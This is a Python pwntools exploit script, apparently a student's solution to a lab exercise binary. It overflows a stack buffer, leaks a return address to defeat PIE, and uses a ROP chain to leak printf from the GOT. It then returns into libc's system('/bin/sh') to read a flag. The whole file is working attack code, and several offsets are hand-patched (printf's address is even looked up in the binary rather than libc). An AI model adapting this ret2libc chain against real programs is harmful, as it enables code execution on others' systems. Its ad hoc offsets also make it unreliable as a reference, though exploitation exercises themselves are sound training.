#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise4/exercise4c'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *(get_message+47)
c
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()
elf = ELF("/home/student/handout/exercise4/exercise4c")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

elf_main = elf.symbols['main']
libc_printf = elf.symbols['printf']
offst = 256 + 8

r.recvuntil(b'send:\n')
r.sendline(b'A' * offst)
line = r.recvline()
end = line.index(b'?!')
main_ret = line[4 + offst:end]
main_ret  = int.from_bytes(main_ret, byteorder='little')

main_ret_offset = 0x58 # found via ghidra
offset = main_ret - elf_main - main_ret_offset

print("offset", hex(offset))
elf.address = offset
rop = ROP(elf)

elf_get_message = elf.symbols['get_message']
elf_printf = elf.symbols['printf']
got_printf = elf.got['printf']

pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret']).address
ret = rop.find_gadget(['ret']).address

r.recvuntil(b'send:\n')
r.send(b'A' * offst)
r.send(p64(pop_rdi_ret)) # jump to the pop rdi; ret gadget
r.send(p64(got_printf))  # the argument of the printf
r.send(p64(ret))         
r.send(p64(elf_printf)) 
r.send(p64(ret))
r.sendline(p64(elf_get_message)) # where to jump back to

line = r.recvline()
really_str = b'Really?'
start = line.index(really_str)
end = line.index(b'Enter')
printf_addr = line[start+len(really_str):end]
printf_addr  = int.from_bytes(printf_addr, byteorder='little')

libc_offset = printf_addr - libc_printf
libc.address = libc_offset
print(hex(libc.address), hex(printf_addr) , hex(libc_printf))

broken_system = libc.symbols['system']
print("expected system", hex(broken_system))

system_offset = 0xfa00 # offset from printf computed by hand
system = printf_addr - system_offset
exit_offset = 0x1b250 # offset from printf computed by hand
exit = libc.symbols['exit'] + libc_offset

diff = broken_system - system
print("diff", hex(diff))
bin_sh = next(libc.search(b'/bin/sh')) - diff

print("real system", hex(system))
r.send(b'A' * offst)
r.send(p64(pop_rdi_ret)) # jump to the pop rdi; ret gadget
r.send(p64(bin_sh))  # the argument of the printf
r.send(p64(ret))         
r.send(p64(system)) 
r.send(p64(ret))         
r.sendline(p64(exit)) 

r.sendline(b'cat flag && exit')

print(r.recvall())
